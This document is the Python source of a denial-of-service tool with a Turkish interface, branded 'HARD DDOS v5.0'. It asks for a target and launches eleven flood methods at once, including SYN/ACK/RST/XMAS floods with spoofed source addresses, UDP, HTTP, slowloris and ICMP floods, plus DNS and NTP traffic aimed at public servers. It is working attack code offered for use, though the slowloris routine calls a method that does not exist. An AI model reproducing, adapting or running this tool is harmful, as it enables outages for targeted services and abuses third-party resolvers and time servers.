#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import threading
import time
import random
import sys
import os
import signal
import struct
from concurrent.futures import ThreadPoolExecutor
import warnings

try:
    from scapy.all import *
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("[!] Scapy yüklü değil. Raw paket metodları devre dışı.")

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False
    print("[!] Requests yüklü değil. HTTP metodları devre dışı.")

warnings.filterwarnings("ignore")

# ==================== RENKLER ====================
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
RESET = '\033[0m'
BOLD = '\033[1m'
BLINK = '\033[5m'

# ==================== BANNER ====================
BANNER = f"""
{RED}{BOLD}
██╗  ██╗ █████╗ ██████╗ ██████╗     ██████╗ ██████╗  ██████╗ ███████╗
██║  ██║██╔══██╗██╔══██╗██╔══██╗    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
███████║███████║██████╔╝██║  ██║    ██║  ██║██║  ██║██║   ██║███████╗
██╔══██║██╔══██║██╔══██╗██║  ██║    ██║  ██║██║  ██║██║   ██║╚════██║
██║  ██║██║  ██║██║  ██║██████╔╝    ██████╔╝██████╔╝╚██████╔╝███████║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝     ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
{RESET}
{YELLOW}                    ⚡ HARD DDOS v5.0 - ELITE EDITION ⚡
{RED}{BOLD}                           Made By diablocxn
{RESET}
{CYAN}═══════════════════════════════════════════════════════════════════════════
{WHITE}  SYN | UDP | HTTP | SLOWLORIS | ICMP | ACK | RST | XMAS | DNS | NTP
{CYAN}═══════════════════════════════════════════════════════════════════════════
{RESET}
"""

class HardDDOS:
    def __init__(self):
        self.target_host = ""
        self.target_port = 80
        self.packet_size = 65535
        self.attack_duration = 0  # 0 = sonsuz
        self.thread_count = 1000
        self.attacking = False
        self.total_packets = 0
        self.total_bytes = 0
        self.lock = threading.Lock()
        
    def clear(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def banner(self):
        self.clear()
        print(BANNER)
    
    def target_setup(self):
        """Hedef yapılandırması"""
        self.banner()
        
        print(f"{CYAN}[+] HEDEF BİLGİLERİ{RESET}")
        print(f"{YELLOW}{'─'*50}{RESET}")
        
        self.target_host = input(f"{GREEN}📍 Hedef IP/URL: {RESET}").strip()
        if not self.target_host:
            print(f"{RED}[!] Hedef boş olamaz!{RESET}")
            return False
            
        try:
            port = input(f"{GREEN}🔌 Hedef Port (80): {RESET}").strip()
            self.target_port = int(port) if port else 80
        except:
            self.target_port = 80
            
        try:
            size = input(f"{GREEN}📦 Paket Boyutu (65535): {RESET}").strip()
            self.packet_size = int(size) if size else 65535
            self.packet_size = min(max(self.packet_size, 64), 65535)
        except:
            self.packet_size = 65535
            
        try:
            duration = input(f"{GREEN}⏱️  Süre - saniye (0=Sonsuz): {RESET}").strip()
            self.attack_duration = int(duration) if duration else 0
        except:
            self.attack_duration = 0
            
        try:
            threads = input(f"{GREEN}🧵 Thread Sayısı (1000): {RESET}").strip()
            self.thread_count = int(threads) if threads else 1000
        except:
            self.thread_count = 1000
        
        # Onay ekranı
        self.banner()
        print(f"{CYAN}[+] SALDIRI KONFİGÜRASYONU{RESET}")
        print(f"{YELLOW}{'─'*50}{RESET}")
        print(f"{GREEN}  🎯 Hedef: {WHITE}{self.target_host}:{self.target_port}{RESET}")
        print(f"{GREEN}  📦 Paket Boyutu: {WHITE}{self.packet_size} bytes{RESET}")
        print(f"{GREEN}  ⏱️  Süre: {WHITE}{'SONSUZ' if self.attack_duration == 0 else f'{self.attack_duration} saniye'}{RESET}")
        print(f"{GREEN}  🧵 Thread: {WHITE}{self.thread_count}{RESET}")
        print(f"{YELLOW}{'─'*50}{RESET}")
        
        confirm = input(f"{RED}{BLINK}[!] SALDIRIYI BAŞLATMAK İÇİN ENTER [!]{RESET}")
        return True
    
    def stop_attack(self, signum, frame):
        self.attacking = False
        print(f"\n\n{RED}[!] SALDIRI DURDURULDU!{RESET}")
        sys.exit(0)
    
    def update_stats(self, bytes_sent):
        with self.lock:
            self.total_packets += 1
            self.total_bytes += bytes_sent
    
    def stats_display(self, start_time):
        last_packets = 0
        last_bytes = 0
        
        while self.attacking:
            time.sleep(1)
            
            with self.lock:
                current_packets = self.total_packets
                current_bytes = self.total_bytes
            
            pps = current_packets - last_packets
            bps = current_bytes - last_bytes
            mbps = bps / (1024 * 1024)
            
            last_packets = current_packets
            last_bytes = current_bytes
            
            total_mb = current_bytes / (1024 * 1024)
            elapsed = time.time() - start_time
            
            if self.attack_duration > 0:
                remaining = max(0, self.attack_duration - elapsed)
                time_str = f"{remaining:.0f}s"
            else:
                time_str = f"{elapsed:.0f}s"
            
            print(f"\r{RED}🔥 SALDIRI AKTİF {RESET}"
                  f"{GREEN}Paket: {WHITE}{current_packets:,}{RESET} | "
                  f"{GREEN}Hız: {WHITE}{pps:,} p/s{RESET} | "
                  f"{GREEN}Bant: {WHITE}{mbps:.2f} MB/s{RESET} | "
                  f"{GREEN}Toplam: {WHITE}{total_mb:.2f} MB{RESET} | "
                  f"{YELLOW}Süre: {WHITE}{time_str}{RESET}  ", end="")
    
    def resolve_target(self):
        try:
            return socket.gethostbyname(self.target_host)
        except:
            return self.target_host
    
    # ==================== SALDIRI METODLARI ====================
    
    def syn_flood(self):
        """SYN Flood Saldırısı"""
        if not SCAPY_AVAILABLE:
            return
        
        target = self.resolve_target()
        
        def attack():
            while self.attacking:
                try:
                    sport = random.randint(1024, 65535)
                    src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                    ip = IP(src=src_ip, dst=target)
                    tcp = TCP(sport=sport, dport=self.target_port, flags="S")
                    send(ip/tcp, verbose=0)
                    self.update_stats(40)
                except:
                    pass
        
        for _ in range(self.thread_count // 8):
            threading.Thread(target=attack, daemon=True).start()
    
    def udp_flood(self):
        """UDP Flood Saldırısı"""
        target = self.resolve_target()
        
        def attack():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload = os.urandom(self.packet_size)
                
                while self.attacking:
                    try:
                        sock.sendto(payload, (target, random.randint(1, 65535)))
                        self.update_stats(len(payload))
                    except:
                        pass
            except:
                pass
        
        for _ in range(self.thread_count // 4):
            threading.Thread(target=attack, daemon=True).start()
    
    def http_flood(self):
        """HTTP Flood Saldırısı"""
        if not REQUESTS_AVAILABLE:
            return
        
        target = self.resolve_target()
        url = f"http://{target}:{self.target_port}"
        
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15",
        ]
        
        def get_attack():
            while self.attacking:
                try:
                    headers = {'User-Agent': random.choice(user_agents),
                              'Accept': '*/*',
                              'Connection': 'keep-alive'}
                    r = requests.get(url, headers=headers, timeout=3, verify=False)
                    self.update_stats(len(r.content))
                except:
                    pass
        
        def post_attack():
            while self.attacking:
                try:
                    data = {'payload': os.urandom(min(self.packet_size, 2048)).hex()}
                    headers = {'User-Agent': random.choice(user_agents)}
                    r = requests.post(url, data=data, headers=headers, timeout=3, verify=False)
                    self.update_stats(len(r.content))
                except:
                    pass
        
        for _ in range(self.thread_count // 15):
            threading.Thread(target=get_attack, daemon=True).start()
            threading.Thread(target=post_attack, daemon=True).start()
    
    def slowloris(self):
        """Slowloris Saldırısı"""
        target = self.resolve_host()
        sockets_list = []
        list_lock = threading.Lock()
        
        def create_sockets():
            with list_lock:
                for _ in range(min(300, self.thread_count)):
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(4)
                        s.connect((target, self.target_port))
                        s.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
                        s.send(f"Host: {target}\r\n".encode())
                        s.send("User-Agent: Mozilla/5.0\r\n".encode())
                        s.send("Accept: */*\r\n".encode())
                        sockets_list.append(s)
                    except:
                        pass
        
        def keep_sockets_alive():
            while self.attacking:
                with list_lock:
                    dead_sockets = []
                    for s in sockets_list:
                        try:
                            s.send(f"X-Header-{random.randint(1, 9999)}: {random.randint(1, 9999)}\r\n".encode())
                            self.update_stats(30)
                        except:
                            dead_sockets.append(s)
                    
                    for s in dead_sockets:
                        sockets_list.remove(s)
                
                if len(sockets_list) < 100:
                    create_sockets()
                
                time.sleep(10)
        
        create_sockets()
        threading.Thread(target=keep_sockets_alive, daemon=True).start()
    
    def icmp_flood(self):
        """ICMP Flood Saldırısı"""
        target = self.resolve_target()
        
        def attack():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            except:
                return
            
            packet_id = random.randint(0, 65535)
            payload = os.urandom(min(self.packet_size, 1472))
            icmp_header = struct.pack('!BBHHH', 8, 0, 0, packet_id, 1)
            packet = icmp_header + payload
            
            while self.attacking:
                try:
                    sock.sendto(packet, (target, 0))
                    self.update_stats(len(packet))
                except:
                    pass
        
        for _ in range(self.thread_count // 8):
            threading.Thread(target=attack, daemon=True).start()
    
    def ack_flood(self):
        """ACK Flood Saldırısı"""
        if not SCAPY_AVAILABLE:
            return
        
        target = self.resolve_target()
        
        def attack():
            while self.attacking:
                try:
                    sport = random.randint(1024, 65535)
                    src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                    ip = IP(src=src_ip, dst=target)
                    tcp = TCP(sport=sport, dport=self.target_port, flags="A")
                    send(ip/tcp, verbose=0)
                    self.update_stats(40)
                except:
                    pass
        
        for _ in range(self.thread_count // 8):
            threading.Thread(target=attack, daemon=True).start()
    
    def rst_flood(self):
        """RST Flood Saldırısı"""
        if not SCAPY_AVAILABLE:
            return
        
        target = self.resolve_target()
        
        def attack():
            while self.attacking:
                try:
                    sport = random.randint(1024, 65535)
                    src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                    ip = IP(src=src_ip, dst=target)
                    tcp = TCP(sport=sport, dport=self.target_port, flags="R")
                    send(ip/tcp, verbose=0)
                    self.update_stats(40)
                except:
                    pass
        
        for _ in range(self.thread_count // 8):
            threading.Thread(target=attack, daemon=True).start()
    
    def xmas_flood(self):
        """XMAS Flood Saldırısı"""
        if not SCAPY_AVAILABLE:
            return
        
        target = self.resolve_target()
        
        def attack():
            while self.attacking:
                try:
                    sport = random.randint(1024, 65535)
                    src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                    ip = IP(src=src_ip, dst=target)
                    tcp = TCP(sport=sport, dport=self.target_port, flags="FPU")
                    send(ip/tcp, verbose=0)
                    self.update_stats(40)
                except:
                    pass
        
        for _ in range(self.thread_count // 8):
            threading.Thread(target=attack, daemon=True).start()
    
    def dns_amplification(self):
        """DNS Amplifikasyon Saldırısı"""
        target = self.resolve_target()
        dns_servers = [
            "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
            "208.67.222.222", "208.67.220.220", "9.9.9.9", "149.112.112.112"
        ]
        
        def attack():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                while self.attacking:
                    for dns in random.sample(dns_servers, 3):
                        txid = random.randint(0, 65535)
                        query = struct.pack('!HHHHHH', txid, 0x0100, 0x0001, 0x0000, 0x0000, 0x0000)
                        query += b'\x03any\x03any\x00'
                        query += struct.pack('!HH', 0x00FF, 0x0001)
                        
                        sock.sendto(query, (dns, 53))
                        self.update_stats(len(query))
            except:
                pass
        
        for _ in range(min(self.thread_count // 20, 15)):
            threading.Thread(target=attack, daemon=True).start()
    
    def ntp_amplification(self):
        """NTP Amplifikasyon Saldırısı"""
        target = self.resolve_target()
        ntp_servers = [
            "0.pool.ntp.org", "1.pool.ntp.org", "2.pool.ntp.org", "3.pool.ntp.org",
            "time.google.com", "time.cloudflare.com", "time.nist.gov", "time.windows.com"
        ]
        
        ntp_payload = b'\x17\x00\x03\x2a' + b'\x00' * 44
        
        def attack():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                
                while self.attacking:
                    for server in random.sample(ntp_servers, 3):
                        try:
                            sock.sendto(ntp_payload, (server, 123))
                            self.update_stats(len(ntp_payload))
                        except:
                            pass
            except:
                pass
        
        for _ in range(min(self.thread_count // 20, 10)):
            threading.Thread(target=attack, daemon=True).start()
    
    def tcp_connect_flood(self):
        """TCP Bağlantı Flood Saldırısı"""
        target = self.resolve_target()
        
        def attack():
            while self.attacking:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    s.connect((target, self.target_port))
                    s.send(os.urandom(min(self.packet_size, 2048)))
                    self.update_stats(2048)
                    s.close()
                except:
                    pass
        
        for _ in range(self.thread_count // 8):
            threading.Thread(target=attack, daemon=True).start()
    
    # ==================== ANA BAŞLATMA ====================
    
    def launch_attack(self):
        """Tüm saldırı metodlarını başlat"""
        if not self.target_setup():
            return
        
        signal.signal(signal.SIGINT, self.stop_attack)
        signal.signal(signal.SIGTERM, self.stop_attack)
        
        self.attacking = True
        
        print(f"\n{RED}{BOLD}[!] SALDIRI BAŞLATILIYOR...{RESET}")
        print(f"{YELLOW}[!] Durdurmak için Ctrl+C{RESET}\n")
        
        start_time = time.time()
        
        # İstatistik thread'i
        threading.Thread(target=self.stats_display, args=(start_time,), daemon=True).start()
        
        # Tüm saldırı metodlarını topla
        attack_methods = [
            self.syn_flood,
            self.udp_flood,
            self.http_flood,
            self.slowloris,
            self.icmp_flood,
            self.ack_flood,
            self.rst_flood,
            self.xmas_flood,
            self.dns_amplification,
            self.ntp_amplification,
            self.tcp_connect_flood,
        ]
        
        # Tüm metodları paralel başlat
        with ThreadPoolExecutor(max_workers=len(attack_methods)) as executor:
            for method in attack_methods:
                executor.submit(method)
        
        # Süre kontrolü
        while self.attacking:
            if self.attack_duration > 0:
                if (time.time() - start_time) >= self.attack_duration:
                    self.attacking = False
                    break
            time.sleep(0.5)
        
        elapsed = time.time() - start_time
        
        print(f"\n\n{GREEN}[✓] SALDIRI TAMAMLANDI!{RESET}")
        print(f"{CYAN}[+] Toplam Süre: {elapsed:.2f} saniye{RESET}")
        print(f"{CYAN}[+] Toplam Paket: {self.total_packets:,}{RESET}")
        print(f"{CYAN}[+] Toplam Veri: {self.total_bytes / (1024*1024):.2f} MB{RESET}")

if __name__ == "__main__":
    try:
        if os.geteuid() != 0:
            print(f"{YELLOW}[!] UYARI: Maksimum güç için ROOT yetkisi gerekli!{RESET}")
            print(f"{YELLOW}[!] sudo python3 {sys.argv[0]}{RESET}\n")
        
        ddos = HardDDOS()
        ddos.launch_attack()
        
    except KeyboardInterrupt:
        print(f"\n{RED}[!] Program sonlandırıldı.{RESET}")
    except Exception as e:
        print(f"{RED}[!] Hata: {e}{RESET}")
